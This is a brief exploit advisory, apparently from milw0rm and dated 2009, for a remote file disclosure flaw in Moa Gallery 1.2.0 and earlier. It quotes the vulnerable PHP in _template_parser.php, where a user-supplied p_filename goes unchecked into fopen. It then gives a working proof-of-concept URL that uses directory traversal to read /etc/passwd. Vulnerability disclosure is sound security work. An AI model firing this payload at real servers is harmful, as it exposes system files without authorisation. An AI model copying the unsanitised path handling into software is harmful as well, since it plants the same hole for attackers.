@@ -1,0 +1,15 @@
+Moa Gallery <= 1.2.0 Remote File Disclosure Vulnerability
+Code In sources\_template_parser.php
+
+
+    $filename = $MOA_PATH."templates/".$template_name."/".$p_filename;
+
+    $fp = @fopen($filename, "r");
+    if ((!$fp) && (is_bool($fp)))
+    {
+      $fp = $fp = @fopen($MOA_PATH."templates/MoaDefault/".$p_filename, "r");
+
+POC
+/sources/_template_parser.php?p_filename=../../../../../../../../../../../../../../../etc/passwd
+
+# milw0rm.com [2009-08-26]
